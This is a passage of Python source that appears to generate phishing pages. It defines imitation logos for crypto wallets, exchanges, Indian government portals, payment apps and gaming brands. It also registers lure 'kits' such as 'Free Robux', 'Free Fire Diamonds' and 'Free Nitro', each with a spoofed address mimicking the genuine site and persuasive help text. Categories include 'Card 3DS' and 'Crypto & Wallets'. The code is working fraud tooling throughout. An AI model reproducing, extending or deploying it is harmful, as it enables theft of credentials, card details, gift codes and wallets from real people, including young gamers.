              '.9-2 .9s-1.4-.8-2-.9c-.6-.1-1.3.1-1.6-.1-.3-.2-.2-.7-.4-.9-.3-.3-1.2-.3-1.7-.6-.4-.2-.4-.6 0-.7'
              '.7-.2 1.7-.6 2.4-1.4.5-.6.9-1.3.7-1.7-.3-.4-1.1-.4-1.7-.7-.5-.3-.5-1 0-1.2.4-.2 1 .2 1.4 0'
              '.2-.5.3-1.2.3-2.2 0-3 1.6-5 4.6-5z"/></svg>'),
 "reddit": ('<svg width="34" height="34" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#ff4500"/>'
            '<circle cx="9" cy="12.5" r="1.6" fill="#fff"/><circle cx="15" cy="12.5" r="1.6" fill="#fff"/>'
            '<path d="M8 15.5c1 .8 2.4 1.3 4 1.3s3-.5 4-1.3" stroke="#fff" stroke-width="1.3" fill="none" '
            'stroke-linecap="round"/><circle cx="17.6" cy="8.4" r="1.3" fill="#fff"/>'
            '<path d="M12 6.4l.9 3" stroke="#fff" stroke-width="1.1"/></svg>'),
 "pinterest": ('<svg width="34" height="34" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#e60023"/>'
               '<text x="12" y="17.6" font-family="Georgia,serif" font-size="14" font-weight="700" fill="#fff" '
               'text-anchor="middle">P</text></svg>'),
 "discord": ('<svg width="27" height="27" viewBox="0 0 24 24" fill="#5865F2"><path d="M20.317 4.37a19.79 19.79 0 '
             '0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 '
             '12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027'
             'C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 '
             '.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892'
             '.077.077 0 0 1-.008-.128c.126-.094.252-.192.372-.291a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 '
             '1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 '
             '12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 '
             '19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 '
             '0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 '
             '2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 '
             '0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>'
             '</svg>'),
 "twitch": ('<svg width="100" height="26" viewBox="0 0 100 26"><path fill="#9146ff" d="M5 2h17v12l-5 5h-5l-4 4H5v-4H1V6z"/>'
            '<rect x="10.5" y="6" width="2.4" height="6" fill="#fff"/><rect x="15.5" y="6" width="2.4" height="6" fill="#fff"/>'
            '<text x="29" y="19" font-family="Arial" font-size="15" font-weight="800" fill="#9146ff">Twitch</text></svg>'),
 "metamask": ('<svg width="32" height="32" viewBox="0 0 24 24"><path fill="#e2761b" d="M20 4l-7.4 5.6 1.4-3.3z"/>'
              '<path fill="#e2761b" d="M4 4l7.4 5.6L10 6.3z"/><path fill="#cd6116" d="M17 20l-2 3 4.4 1.2 1.2-4.2z"/>'
              '<path fill="#cd6116" d="M5.4 20l1.2 4.2L11 23l-2-3z"/><path fill="#f6851b" d="M11 23l3 2.4v-4.8z"/>'
              '<path fill="#f6851b" d="M13 23l3-2.4-3-.4z"/><path fill="#763d16" d="M16 13.6l-1.4-2.8 1-2.8z"/>'
              '<path fill="#763d16" d="M8 13.6l.4-5.6 1 2.8z"/><path fill="#f6851b" d="M9.4 20l2.6.6-.2-2.2z"/>'
              '<path fill="#f6851b" d="M14.6 20l-2.4-1.6-.2 2.2z"/></svg>'),
 "trustwallet": ('<svg width="30" height="30" viewBox="0 0 28 28"><path fill="#3375bb" d="M14 3l9 3v7c0 6-4 9.5-9 11'
                 '-5-1.5-9-5-9-11V6z"/><path fill="#fff" d="M12.4 12.6l1.6 1.7 3-3.4 1.4 1.3-4.4 4.9-3-3z"/></svg>'),
 "phantom": ('<svg width="32" height="32" viewBox="0 0 28 28"><rect x="2" y="3" width="22" height="22" rx="8" '
             'fill="#ab9ff2"/><circle cx="9.5" cy="13" r="1.9" fill="#181818"/><circle cx="16.5" cy="13" r="1.9" '
             'fill="#181818"/><path d="M10 19c1.8 1.3 3.8 1.3 5.6 0" stroke="#181818" stroke-width="1.6" fill="none" '
             'stroke-linecap="round"/></svg>'),
 "exodus": ('<svg width="30" height="30" viewBox="0 0 28 28"><path fill="#5c2d91" d="M13 4l8 5-8 5-8-5zM13 16l8 5'
            '-8 4-8-4z"/></svg>'),
 "ledger": ('<svg width="30" height="30" viewBox="0 0 24 24"><rect x="2" y="3" width="18" height="18" rx="3" '
            'fill="#fff"/><rect x="6" y="7" width="7" height="7" fill="#111"/></svg>'),
 "coinbase": ('<svg width="30" height="30" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#0052ff"/>'
              '<rect x="7.8" y="9.4" width="8.4" height="5.2" rx="1.6" fill="#fff"/></svg>'),
 "binance": ('<svg width="30" height="30" viewBox="0 0 24 24"><path fill="#f0b90b" d="M13 2l3.2 3.2L13 8.4 9.8 5.2z'
             'M6.4 8.6l3.2 3.2-3.2 3.2L3.2 11.8zM19.6 8.6l3.2 3.2-3.2 3.2-3.2-3.2zM13 12.2l3.2 3.2-3.2 3.2'
             '-3.2-3.2z"/></svg>'),
 "kucoin": ('<svg width="30" height="30" viewBox="0 0 24 24"><path fill="#24ae8f" d="M13 2l4 4-4 4-4-4z'
            'M8 7l4 4-4 4-4-4zM18 7l4 4-4 4-4-4z"/></svg>'),
 "bybit": ('<svg width="72" height="25" viewBox="0 0 72 25"><text x="0" y="19" font-family="Arial Black,Arial" '
           'font-size="17" font-weight="900" fill="#f7a600" letter-spacing="-0.4">BYBIT</text></svg>'),
 "okx": ('<svg width="58" height="25" viewBox="0 0 58 25"><text x="0" y="19" font-family="Arial Black,Arial" '
         'font-size="17" font-weight="900" fill="#fff" letter-spacing="1">OKX</text></svg>'),
 "flipkart": ('<svg width="130" height="26" viewBox="0 0 130 26"><rect width="24" height="22" rx="3" fill="#2874f0"/>'
              '<text x="5" y="17" font-family="Georgia,serif" font-size="14" font-style="italic" '
              'font-weight="700" fill="#fff">F</text><text x="30" y="17" font-family="Arial" font-size="15" '
              'font-weight="700" fill="#2874f0">Flipkart</text></svg>'),
 "myntra": ('<svg width="116" height="26" viewBox="0 0 116 26"><text x="0" y="19" font-family="Arial" '
            'font-size="17" font-weight="800" fill="#ff3f6c" letter-spacing="-0.6">Myntra</text></svg>'),
 "meesho": ('<svg width="110" height="26" viewBox="0 0 110 26"><text x="0" y="19" font-family="Arial" '
            'font-size="17" font-weight="800" fill="#570d8c" letter-spacing="-0.5">meesho</text></svg>'),
 "ajio": ('<svg width="70" height="26" viewBox="0 0 70 26"><text x="0" y="19" font-family="Arial" font-size="18" '
          'font-weight="800" fill="#2c4152" letter-spacing="2">AJIO</text></svg>'),
 "nykaa": ('<svg width="94" height="26" viewBox="0 0 94 26"><text x="0" y="19" font-family="Georgia,serif" '
           'font-size="18" font-weight="700" fill="#fc2779">Nykaa</text></svg>'),
 "snapdeal": ('<svg width="128" height="26" viewBox="0 0 128 26"><text x="0" y="19" font-family="Arial" '
              'font-size="16" font-weight="800" fill="#e40046" letter-spacing="-0.5">Snapdeal</text></svg>'),
 "aliexpress": ('<svg width="128" height="26" viewBox="0 0 128 26"><text x="0" y="19" font-family="Arial" '
                'font-size="16" font-weight="700" fill="#ff4747">AliExpress</text></svg>'),
 "tatacliq": ('<svg width="110" height="26" viewBox="0 0 110 26"><text x="0" y="19" font-family="Arial" '
              'font-size="16" font-weight="800" fill="#1a1a1a">Tata CLiQ</text></svg>'),
 "shopsy": ('<svg width="108" height="26" viewBox="0 0 108 26"><text x="0" y="19" font-family="Arial" '
            'font-size="16" font-weight="800" fill="#e40046">Shopsy</text></svg>'),
 "irctc": ('<svg width="120" height="29" viewBox="0 0 120 29"><rect width="27" height="27" rx="5" fill="#1b3a6b"/>'
           '<text x="5" y="20" font-family="Arial" font-size="11" font-weight="800" fill="#fff">IR</text>'
           '<text x="33" y="14" font-family="Arial" font-size="12" font-weight="800" fill="#1b3a6b">IRCTC</text>'
           '<text x="33" y="23" font-family="Arial" font-size="6.5" fill="#6b7280">INDIAN RAILWAYS</text></svg>'),
 "epfo": ('<svg width="112" height="29" viewBox="0 0 112 29"><circle cx="13.5" cy="13.5" r="12.5" fill="#0b3d6b"/>'
          '<text x="13.5" y="18.5" font-family="Arial" font-size="10" font-weight="800" fill="#fff" '
          'text-anchor="middle">EPF</text><text x="31" y="12.5" font-family="Arial" font-size="11" font-weight="800" '
          'fill="#0b3d6b">EPFO</text><text x="31" y="21.5" font-family="Arial" font-size="6" fill="#6b7280">'
          'UNIFIED PORTAL</text></svg>'),
 "incometax": ('<svg width="138" height="29" viewBox="0 0 138 29"><rect width="27" height="27" rx="4" fill="#0f3d6e"/>'
               '<text x="6" y="20" font-family="Arial" font-size="10" font-weight="800" fill="#fff">IT</text>'
               '<text x="33" y="14" font-family="Arial" font-size="11" font-weight="800" fill="#0f3d6e">'
               'INCOME TAX</text><text x="33" y="23" font-family="Arial" font-size="6" fill="#6b7280">'
               'E-FILING</text></svg>'),
 "uidai": ('<svg width="124" height="29" viewBox="0 0 124 29"><rect width="27" height="27" rx="4" fill="#e8481c"/>'
           '<text x="6" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">AD</text>'
           '<text x="33" y="14" font-family="Arial" font-size="11" font-weight="800" fill="#e8481c">AADHAAR</text>'
           '<text x="33" y="23" font-family="Arial" font-size="6" fill="#6b7280">UIDAI</text></svg>'),
 "digilocker": ('<svg width="130" height="29" viewBox="0 0 130 29"><rect width="27" height="27" rx="4" fill="#0b5cab"/>'
                '<text x="5" y="20" font-family="Arial" font-size="10" font-weight="800" fill="#fff">DL</text>'
                '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#0b5cab">'
                'DigiLocker</text></svg>'),
 "parivahan": ('<svg width="130" height="29" viewBox="0 0 130 29"><rect width="27" height="27" rx="4" fill="#0c6b3f"/>'
               '<text x="5" y="20" font-family="Arial" font-size="10" font-weight="800" fill="#fff">PV</text>'
               '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#0c6b3f">'
               'Parivahan</text></svg>'),
 "fastag": ('<svg width="118" height="29" viewBox="0 0 118 29"><rect width="27" height="27" rx="4" fill="#123a63"/>'
            '<text x="5" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">FT</text>'
            '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#123a63">NETC</text></svg>'),
 "passport": ('<svg width="126" height="29" viewBox="0 0 126 29"><rect width="27" height="27" rx="4" fill="#0b3d6b"/>'
              '<text x="5" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">PS</text>'
              '<text x="33" y="14" font-family="Arial" font-size="11" font-weight="800" fill="#0b3d6b">'
              'PASSPORT</text><text x="33" y="23" font-family="Arial" font-size="6" fill="#6b7280">SEVA</text></svg>'),
 "esic": ('<svg width="102" height="29" viewBox="0 0 102 29"><rect width="27" height="27" rx="4" fill="#7a1f2b"/>'
          '<text x="6" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">ES</text>'
          '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#7a1f2b">ESIC</text></svg>'),
 "nps": ('<svg width="114" height="29" viewBox="0 0 114 29"><rect width="27" height="27" rx="4" fill="#1b5e20"/>'
         '<text x="6" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">NPS</text>'
         '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#1b5e20">NPS Trust</text></svg>'),
 "gst": ('<svg width="124" height="29" viewBox="0 0 124 29"><rect width="27" height="27" rx="4" fill="#0f3d6e"/>'
         '<text x="6" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">GST</text>'
         '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#0f3d6e">GST Portal</text></svg>'),
 "echallan": ('<svg width="126" height="29" viewBox="0 0 126 29"><rect width="27" height="27" rx="4" fill="#8a1c1c"/>'
              '<text x="5" y="20" font-family="Arial" font-size="9" font-weight="800" fill="#fff">EC</text>'
              '<text x="33" y="19" font-family="Arial" font-size="12" font-weight="800" fill="#8a1c1c">'
              'e-Challan</text></svg>'),
 "jio": ('<svg width="86" height="34" viewBox="0 0 86 34"><text x="0" y="26" font-family="Arial" font-size="26" '
         'font-weight="800" fill="#0a2885" letter-spacing="-1">Jio</text></svg>'),
 "airtel": ('<svg width="110" height="29" viewBox="0 0 110 29"><text x="0" y="23" font-family="Arial" '
            'font-size="22" font-weight="700" fill="#e40000" letter-spacing="-0.8">airtel</text></svg>'),
 "vi": ('<svg width="58" height="31" viewBox="0 0 58 31"><text x="0" y="24" font-family="Georgia,serif" '
        'font-size="25" font-weight="700" fill="#ed1c24">Vi</text></svg>'),
 "bsnl": ('<svg width="102" height="29" viewBox="0 0 102 29"><text x="0" y="22" font-family="Arial" '
          'font-size="20" font-weight="800" fill="#004b8d" letter-spacing="-0.4">BSNL</text></svg>'),
 "mtnl": ('<svg width="92" height="29" viewBox="0 0 92 29"><text x="0" y="22" font-family="Arial" '
          'font-size="20" font-weight="800" fill="#0b3d6b">MTNL</text></svg>'),
 "steam": ('<svg width="104" height="26" viewBox="0 0 104 26"><circle cx="12" cy="12" r="11" fill="#66c0f4"/>'
           '<circle cx="9" cy="9" r="3.2" fill="#1b2838"/><circle cx="16" cy="15" r="2.4" fill="#1b2838"/>'
           '<text x="29" y="18" font-family="Arial" font-size="15" font-weight="700" fill="#66c0f4">STEAM</text></svg>'),
 "epicgames": ('<svg width="118" height="26" viewBox="0 0 118 26"><rect x="0" y="1" width="22" height="22" rx="5" '
               'fill="#fff"/><text x="5" y="17" font-family="Arial" font-size="11" font-weight="800" fill="#111">E</text>'
               '<text x="27" y="18" font-family="Arial" font-size="13" font-weight="700" fill="#fff">Epic Games</text>'
               '</svg>'),
 "bgmi": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="19" font-family="Arial Black,Arial" '
          'font-size="15" font-weight="900" fill="#f5a623">BGMI</text></svg>'),
 "playstation": ('<svg width="124" height="26" viewBox="0 0 124 26"><text x="0" y="18" font-family="Arial" '
                 'font-size="12.5" font-weight="700" fill="#0070d1">PlayStation</text></svg>'),
 "ubisoft": ('<svg width="104" height="26" viewBox="0 0 104 26"><circle cx="12" cy="12" r="11" fill="#0070ff"/>'
             '<path d="M12 4a8 8 0 0 1 0 16 8 8 0 0 1 0-16zm0 3.4a4.6 4.6 0 1 0 0 9.2 4.6 4.6 0 0 0 0-9.2z" fill="#fff"/>'
             '<text x="29" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#0070ff">Ubisoft</text></svg>'),
 "riot": ('<svg width="90" height="26" viewBox="0 0 90 26"><text x="0" y="19" font-family="Arial" font-size="16" '
          'font-weight="800" fill="#d13639">RIOT</text></svg>'),
 "gitlab": ('<svg width="104" height="26" viewBox="0 0 104 26"><path fill="#fc6d26" d="M12 3l3 7h-6zM5 10h14l-2 5'
            'L12 21 7 15z"/><text x="27" y="18" font-family="Arial" font-size="14" font-weight="700" '
            'fill="#fc6d26">GitLab</text></svg>'),
 "aws": ('<svg width="74" height="26" viewBox="0 0 74 26"><text x="0" y="18" font-family="Arial" font-size="15" '
         'font-weight="800" fill="#232f3e">aws</text><path d="M2 21c9 4 22 4 30 0" stroke="#ff9900" '
         'stroke-width="2" fill="none"/></svg>'),
 "digitalocean": ('<svg width="146" height="26" viewBox="0 0 146 26"><rect x="0" y="3" width="20" height="20" '
                  'rx="3" fill="#0080ff"/><path d="M4 14h6v6H4z" fill="#fff"/>'
                  '<text x="26" y="18" font-family="Arial" font-size="12.5" font-weight="700" fill="#0080ff">'
                  'DigitalOcean</text></svg>'),
 "vultr": ('<svg width="74" height="26" viewBox="0 0 74 26"><text x="0" y="18" font-family="Arial" font-size="15" '
           'font-weight="800" fill="#007bfc">Vultr</text></svg>'),
 "cloudflare": ('<svg width="138" height="26" viewBox="0 0 138 26"><path fill="#f38020" d="M18 8c-1-3-3.6-5-6.6-5'
                '-4 0-7 3.4-6.6 7.4C2 11 0 13 0 15.4 0 18 2 20 4.6 20h11z"/>'
                '<text x="21" y="18" font-family="Arial" font-size="13.5" font-weight="700" fill="#f38020">'
                'Cloudflare</text></svg>'),
 "dropbox": ('<svg width="120" height="26" viewBox="0 0 120 26"><path fill="#0061ff" d="M7 3l5 3.4L7 9.8 2 6.4zM17 3'
             'l5 3.4-5 3.4-5-3.4zM2 13.2l5-3.4 5 3.4-5 3.4zM17 9.8l5 3.4-5 3.4-5-3.4z"/>'
             '<text x="29" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#0061ff">Dropbox</text></svg>'),
 "mega": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" font-size="16" '
          'font-weight="800" fill="#d9272e">MEGA</text></svg>'),
 "primevideo": ('<svg width="138" height="29" viewBox="0 0 138 29"><text x="0" y="17" font-family="Arial" '
                'font-size="16" font-weight="700" fill="#fff">prime</text>'
                '<text x="43" y="17" font-family="Arial" font-size="16" font-weight="700" fill="#00a8e1">video</text>'
                '<path d="M2 22c9 4 22 4 30 0" stroke="#00a8e1" stroke-width="2" fill="none"/></svg>'),
 "hotstar": ('<svg width="138" height="26" viewBox="0 0 138 26"><text x="0" y="19" font-family="Arial" '
             'font-size="16" font-weight="800" fill="#fff">JioHotstar</text></svg>'),
 "sonyliv": ('<svg width="100" height="26" viewBox="0 0 100 26"><text x="0" y="19" font-family="Arial" '
             'font-size="16" font-weight="800" fill="#f5a623">SonyLIV</text></svg>'),
 "slack": ('<svg width="96" height="26" viewBox="0 0 96 26"><g fill="#e01e5a"><rect x="2" y="9" width="6" '
           'height="6" rx="3"/><rect x="10" y="2" width="6" height="6" rx="3"/></g>'
           '<g fill="#36c5f0"><rect x="18" y="6" width="6" height="6" rx="3"/></g>'
           '<text x="29" y="18" font-family="Arial" font-size="14" font-weight="800" fill="#4a154b">slack</text></svg>'),
 "zoom": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" font-size="16" '
          'font-weight="800" fill="#2d8cff">zoom</text></svg>'),
 "notion": ('<svg width="96" height="26" viewBox="0 0 96 26"><rect x="0" y="2" width="22" height="22" rx="4" '
            'fill="#fff" stroke="#111" stroke-width="1.4"/><text x="6" y="19" font-family="Georgia,serif" '
            'font-size="14" font-weight="700" fill="#111">N</text>'
            '<text x="27" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#111">Notion</text></svg>'),
 "adobe": ('<svg width="96" height="26" viewBox="0 0 96 26"><path fill="#ff0000" d="M14 3l-9 20h6l2-5h6zM16 3l9 20'
           'h-6l-3-7z"/><text x="31" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#ff0000">'
           'Adobe</text></svg>'),
 "figma": ('<svg width="90" height="26" viewBox="0 0 90 26"><circle cx="8" cy="6" r="4" fill="#f24e1e"/>'
           '<circle cx="16" cy="6" r="4" fill="#ff7262"/><circle cx="8" cy="13" r="4" fill="#a259ff"/>'
           '<circle cx="16" cy="13" r="4" fill="#1abcfe"/><circle cx="8" cy="20" r="4" fill="#0acf83"/>'
           '<text x="27" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#111">Figma</text></svg>'),
 "yahoo": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="19" font-family="Arial" font-size="17" '
           'font-weight="800" fill="#6001d2" letter-spacing="-0.5">Yahoo!</text></svg>'),
 "protonmail": ('<svg width="124" height="26" viewBox="0 0 124 26"><text x="0" y="18" font-family="Arial" '
                'font-size="14" font-weight="700" fill="#6d4aff">Proton Mail</text></svg>'),
 "zoho": ('<svg width="80" height="26" viewBox="0 0 80 26"><text x="0" y="18" font-family="Arial" font-size="16" '
          'font-weight="800" fill="#e42527">Zoho</text></svg>'),
 "aol": ('<svg width="66" height="26" viewBox="0 0 66 26"><text x="0" y="18" font-family="Arial" font-size="16" '
         'font-weight="800" fill="#1a73e8">AOL</text></svg>'),
 "gmx": ('<svg width="70" height="26" viewBox="0 0 70 26"><text x="0" y="18" font-family="Arial" font-size="16" '
         'font-weight="800" fill="#1c449b">GMX</text></svg>'),
 "stripe": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" font-size="16" '
            'font-weight="800" fill="#635bff">stripe</text></svg>'),
 "razorpay": ('<svg width="118" height="26" viewBox="0 0 118 26"><path fill="#3395ff" d="M4 20L11 4h5L9 20z"/>'
              '<text x="21" y="18" font-family="Arial" font-size="14" font-weight="700" fill="#0c2451">'
              'Razorpay</text></svg>'),
 "paytm": ('<svg width="92" height="26" viewBox="0 0 92 26"><text x="0" y="18" font-family="Arial" font-size="16" '
           'font-weight="800" fill="#00baf2">Pay</text><text x="33" y="18" font-family="Arial" font-size="16" '
           'font-weight="800" fill="#002970">tm</text></svg>'),
 "phonepe": ('<svg width="110" height="26" viewBox="0 0 110 26"><text x="0" y="18" font-family="Arial" '
             'font-size="15" font-weight="800" fill="#5f259f">PhonePe</text></svg>'),
 "wise": ('<svg width="74" height="26" viewBox="0 0 74 26"><path fill="#9fe870" d="M2 8h8l3 10 3-10h6l-6 14H8z"/>'
          '<text x="27" y="18" font-family="Arial" font-size="15" font-weight="800" fill="#163300">wise</text></svg>'),
 "skrill": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" font-size="15" '
            'font-weight="800" fill="#6a1b9a">Skrill</text></svg>'),
 "indiapost": ('<svg width="110" height="26" viewBox="0 0 110 26"><text x="0" y="18" font-family="Arial" '
               'font-size="14" font-weight="800" fill="#b11116">India Post</text></svg>'),
 "dtdc": ('<svg width="70" height="26" viewBox="0 0 70 26"><text x="0" y="18" font-family="Arial" font-size="16" '
          'font-weight="800" fill="#003a70">DTDC</text></svg>'),
 "bluedart": ('<svg width="110" height="26" viewBox="0 0 110 26"><text x="0" y="18" font-family="Arial" '
              'font-size="14" font-weight="800" fill="#003da5">Blue Dart</text></svg>'),
 "delhivery": ('<svg width="116" height="26" viewBox="0 0 116 26"><text x="0" y="18" font-family="Arial" '
               'font-size="14" font-weight="800" fill="#e4002b">Delhivery</text></svg>'),
 "fedex": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" '
           'font-size="16" font-weight="800" fill="#4d148c">FedEx</text></svg>'),
 "dhl": ('<svg width="66" height="26" viewBox="0 0 66 26"><text x="0" y="18" font-family="Arial" font-size="17" '
         'font-weight="900" fill="#ffcc00">DHL</text></svg>'),
 "ekart": ('<svg width="86" height="26" viewBox="0 0 86 26"><text x="0" y="18" font-family="Arial" font-size="16" '
           'font-weight="800" fill="#1a73e8">Ekart</text></svg>'),
}

def mark_logo(s):
    c = s.get("bg") or "#111"
    if lum(c) > 0.9:
        c = s.get("ac") or "#111"
    return crest("".join(p[0] for p in re.split(r"\s+", s["l"]) if p)[:2].upper() or "B",
                 s["l"][:17], c, sub=CATAG.get(s.get("c"), "SECURE"))

def logo_for(k, mx=230):
    s = SITES.get(k)
    if not s:
        return ""
    v = LOGO.get(k)
    if v:
        return '<span class="lmk" style="max-width:%dpx">%s</span>' % (mx, v)
    return '<span class="lmk">%s</span>' % mark_logo(s)

def brand(s, mx=230):
    return logo_for(s["k"], mx)

# ============================================================ kits
SITES = {}
CATS = [("sensor", "Device Check"), ("gift", "Free Codes & Gifts"), ("loan", "Loans & Cards"),
        ("bank", "Banking"), ("card", "Card 3DS"), ("social", "Social"), ("email", "Email & Cloud"),
        ("crypto", "Crypto & Wallets"), ("pay", "Payments"), ("shop", "E-Commerce"),
        ("gov", "Gov & Utility"), ("ship", "Delivery"), ("tel", "Telecom"),
        ("game", "Gaming"), ("dev", "Dev & Server"), ("cloud", "Storage"),
        ("stream", "Streaming"), ("work", "Work")]

def reg(k, label, cat, bg, ac, dom, sub, flow, van=None, idlab=None, idph=None, help=""):
    SITES[k] = dict(k=k, l=label, c=cat, bg=bg, ac=ac, dom=dom, sub=sub, fl=flow,
                    van=van or ("www.%s/login" % dom), idlab=idlab or "Email or username",
                    idph=idph or "Email / username", help=help)

GF = ["code", "login"]
reg("roblox-gift", "Roblox Gift Code", "gift", "#232527", "#e2231a", "roblox.com",
    "Redeem a Roblox gift card", GF, "www.roblox.com/redeem", "Username", "Roblox username",
    "Enter the 12-digit code from your gift card. Roblox gift cards add credit to your account.")
reg("roblox-robux", "Free Robux", "gift", "#232527", "#00a2ff", "roblox.com",
    "Claim free Robux", GF, "www.roblox.com/upgrades/robux", "Username", "Roblox username",
    "Robux are credited to your account instantly after the code is verified.")
reg("ff-diamond", "Free Fire Diamonds", "gift", "#070d15", "#ff9c1a", "reward.ff.garena.com",
    "Free Fire redeem centre", GF, "reward.ff.garena.com/", "Player ID (UID)", "Your numeric UID",
    "Enter your Free Fire UID and the redeem code to receive diamonds instantly.")
reg("ff-diamonds", "Free Diamonds (x2)", "gift", "#070d15", "#ff9c1a", "reward.ff.garena.com",
    "Bonus diamond drop", GF, "reward.ff.garena.com/bonus", "Player ID (UID)", "Your numeric UID",
    "Double diamond event. One claim per UID.")
reg("ff-pass", "Free Fire Elite Pass", "gift", "#070d15", "#ff9c1a", "reward.ff.garena.com",
    "Elite Pass giveaway", GF, "reward.ff.garena.com/elite-pass", "Player ID (UID)", "Your numeric UID",
    "Elite Pass is delivered to your in-game mailbox within 24 hours.")
reg("ziggy-gift", "Ziggy Gift Code", "gift", "#12061f", "#8c52ff", "ziggy.gift",
    "Redeem a Ziggy gift code", GF, "ziggy.gift/redeem", "Username", "Your username",
    "Paste the gift code from your Ziggy voucher to add it to your wallet.")
reg("gplay-gift", "Google Play Gift Code", "gift", "#ffffff", "#34a853", "play.google.com",
    "Redeem a Google Play gift card", GF, "play.google.com/redeem", "Email", "you@gmail.com",
    "Enter the code printed under the scratch layer of your gift card.")
reg("itunes-gift", "Apple Gift Card", "gift", "#ffffff", "#fa243c", "apple.com",
    "Redeem an Apple Gift Card", GF, "www.apple.com/redeem", "Apple ID", "you@icloud.com",
    "Scratch to reveal the code on the back of the card, then enter it below.")
reg("pubg-uc", "PUBG UC Code", "gift", "#111111", "#f2a900", "pubgmobile.com",
    "Redeem UC code", GF, "www.pubgmobile.com/redeem", "Character ID", "Your character ID",
    "Enter your character ID and the UC redeem code to top up instantly.")
reg("uc-free", "Free UC Giveaway", "gift", "#111111", "#f2a900", "pubgmobile.com",
    "Free UC drop", GF, "www.pubgmobile.com/uc-giveaway", "Character ID", "Your character ID",
    "Giveaway UC lands in your account within a few minutes.")
reg("discord-nitro", "Discord Nitro Gift", "gift", "#313338", "#5865f2", "discord.com",
    "Redeem Discord Nitro", GF, "discord.com/billing/gift", "Email", "you@example.com",
    "Paste your Nitro gift link or code to claim it on your account.")
reg("nitro-free", "Free Nitro", "gift", "#313338", "#5865f2", "discord.com",
    "Nitro giveaway", GF, "discord.com/nitro-gift", "Email", "you@example.com",
    "One month of Nitro is added the moment the code is verified.")
reg("steam-gift", "Steam Wallet Gift", "gift", "#1b2838", "#66c0f4", "steampowered.com",
    "Redeem Steam wallet code", GF, "store.steampowered.com/account/redeemwalletcode",
    "Steam account", "Your account name", "Wallet codes are region locked. Redeem on the right store.")
reg("steam-wallet", "Free Steam Wallet", "gift", "#1b2838", "#66c0f4", "steampowered.com",
    "Wallet credit giveaway", GF, "store.steampowered.com/wallet-credit",
    "Steam account", "Your account name", "Credit is added to your Steam wallet.")
reg("vbucks", "Free V-Bucks", "gift", "#2a2a72", "#8b5cf6", "fortnite.com",
    "V-Bucks giveaway", GF, "www.fortnite.com/vbucks", "Epic account", "you@example.com",
    "V-Bucks appear in your locker after the code is claimed.")
reg("coc-gems", "Free Gems (CoC)", "gift", "#c0392b", "#f39c12", "supercell.com",
    "Clash of Clans gem drop", GF, "www.supercell.com/gems", "Player tag", "#ABC123XY",
    "Enter your player tag to receive gems in your village.")
reg("minecoins", "Free Minecoins", "gift", "#3c8527", "#7ec850", "minecraft.net",
    "Minecoin giveaway", GF, "www.minecraft.net/redeem", "Xbox account", "you@outlook.com",
    "Minecoins are added to your Marketplace balance.")
reg("amazon-gift", "Amazon Gift Card", "gift", "#ffffff", "#ff9900", "amazon.in",
    "Redeem Amazon gift card", GF, "www.amazon.in/gc/redeem", "Email or mobile", "you@example.com",
    "Gift card balance is added to your Amazon Pay wallet after verification.")
reg("netflix-gift", "Netflix Gift Card", "gift", "#000000", "#e50914", "netflix.com",
    "Redeem a Netflix gift card", GF, "www.netflix.com/redeem", "Email or phone", "you@example.com",
    "Netflix gift cards apply to the country of purchase only.")
reg("playstation-gift", "PlayStation Gift", "gift", "#003791", "#ffffff", "playstation.com",
    "Redeem PlayStation credit", GF, "www.playstation.com/redeem", "Sign-in ID", "you@example.com",
    "Wallet funds appear in your PlayStation account within a few minutes.")
reg("xbox-gift", "Xbox Gift Card", "gift", "#107c10", "#ffffff", "xbox.com",
